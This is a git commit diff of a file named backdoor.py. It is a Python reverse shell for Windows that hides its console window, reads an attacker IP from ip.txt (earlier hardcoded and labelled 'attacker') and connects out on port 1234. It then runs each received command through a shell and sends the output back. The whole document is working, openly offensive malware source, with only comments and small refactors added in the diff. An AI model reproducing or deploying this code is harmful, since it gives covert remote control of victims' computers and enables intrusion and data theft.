bbe7a6a167e33f976f6977185e6c3e40a7dfb62a
Ph3nX-Z <66122220+Ph3nX-Z@users.noreply.github.com>
2020-06-02 18:16:44 +0200

    Add files via upload

--- backdoor.py
+++ backdoor.py
@@ -1,19 +1,32 @@
 import socket
 import subprocess
 
-def hiden():
+def hiden(): # Hide console
     import win32console
     import win32gui
     win = win32console.GetConsoleWindow()
     win32gui.ShowWindow(win, 0)
 
-hiden()
+hiden() #hiden
 
-ip="192.168.1.17" #attacker
-port=8080
+def read(): #read ip.txt (first line)
+     read=open("ip.txt", "r") # put attacker ip in ip.txt
+     data=read.read()
+     return data
+
+
+ip=read() #get ip
+
+
+port=1234 #connection port
+
+# Connection initialisation
 c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 c.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
 c.connect((ip,port))
+# Connection complete
+
+
 while True:
      command=c.recv(1024)
      if command == b'exit':
@@ -21,5 +34,5 @@ while True:
           break
      else:
           proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-          output= proc.stdout.read()+proc.stderr.read()
+          output= proc.stdout.read()+proc.stderr.read() #get shell
           c.send(output)
